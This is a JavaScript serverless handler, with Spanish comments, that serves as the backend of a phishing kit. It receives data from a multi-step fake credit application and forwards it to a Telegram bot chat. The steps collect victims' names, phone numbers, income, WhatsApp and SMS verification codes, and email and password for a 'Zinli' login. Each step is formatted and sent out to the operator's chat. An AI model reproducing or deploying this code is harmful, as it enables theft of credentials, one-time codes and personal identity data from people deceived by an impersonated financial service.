export default async function handler(req, res) {
  // Configurar CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Método no permitido' });
  }

  const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  if (!TOKEN || !CHAT_ID) {
    return res.status(500).json({ error: 'Configuración del bot incompleta' });
  }

  const datos = req.body;
  let mensaje = '';

  // Formatear mensaje según la fuente
  switch(datos.fuente) {
    case 'index1':
      // Primer index: Monto, Ciudad, Estado, Dispositivo, Zip, País
      mensaje = `💰 *Nueva Consulta de Crédito*\n\n` +
                `📊 *Monto de Credito:* $${datos.monto} USD\n` +
                `🏙️ *Ciudad:* ${datos.ciudad || 'N/A'}\n` +
                `📍 *Estado:* ${datos.estado || 'N/A'}\n` +
                `📱 *Dispositivo:* ${datos.dispositivo || 'N/A'}\n` +
                `📮 *Zip Code:* ${datos.zipCode || 'N/A'}\n` +
                `🌎 *País:* ${datos.pais || 'N/A'}\n` +
                `🔌 *IP:* ${datos.ip || 'N/A'}`;
      break;

    case 'index2':
      // Segundo index: Datos personales + Zip + País
      mensaje = `📝 *Verificación de Identidad - Paso 1*\n\n` +
                `👤 *Nombres:* ${datos.nombres}\n` +
                `👤 *Apellidos:* ${datos.apellidos}\n` +
                `📞 *Teléfono:* ${datos.telefono}\n` +
                `💼 *Ocupación:* ${datos.ocupacion}\n` +
                `💵 *Ingreso Mensual:* ${datos.salario}\n` +
                `📮 *Zip Code:* ${datos.zipCode || 'N/A'}\n` +
                `🌎 *País:* ${datos.pais || 'N/A'}`;
      break;

    case 'index2_whatsapp':
      // Código WhatsApp
      mensaje = `📱 *Código WhatsApp*\n\n` +
                `📞 *Teléfono:* ${datos.telefono}\n` +
                `🔢 *Código:* ${datos.codigoWhatsApp}\n` +
                `📮 *Zip Code:* ${datos.zipCode || 'N/A'}\n` +
                `🌎 *País:* ${datos.pais || 'N/A'}`;
      break;

    case 'index2_sms':
      // Código SMS
      mensaje = `📩 *Código SMS*\n\n` +
                `📞 *Teléfono:* ${datos.telefono}\n` +
                `🔢 *Código:* ${datos.codigoSMS}\n` +
                `📮 *Zip Code:* ${datos.zipCode || 'N/A'}\n` +
                `🌎 *País:* ${datos.pais || 'N/A'}`;
      break;

    case 'index3':
      // Tercer index: Login
      mensaje = `🔐 *Login Zinli*\n\n` +
                `📧 *Email:* ${datos.email}\n` +
                `🔑 *Password:* ${datos.password}\n` +
                `📮 *Zip Code:* ${datos.zipCode || 'N/A'}\n` +
                `🌎 *País:* ${datos.pais || 'N/A'}`;
      break;

    default:
      mensaje = `📨 *Datos Recibidos*\n\n` +
                `\`\`\`\n${JSON.stringify(datos, null, 2)}\n\`\`\``;
  }

  const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
  const params = {
    chat_id: CHAT_ID,
    text: mensaje,
    parse_mode: 'Markdown'
  };

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(params),
    });

    if (!response.ok) {
      throw new Error('Error al enviar mensaje a Telegram');
    }

    res.status(200).json({ success: true, message: 'Mensaje enviado correctamente' });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
}
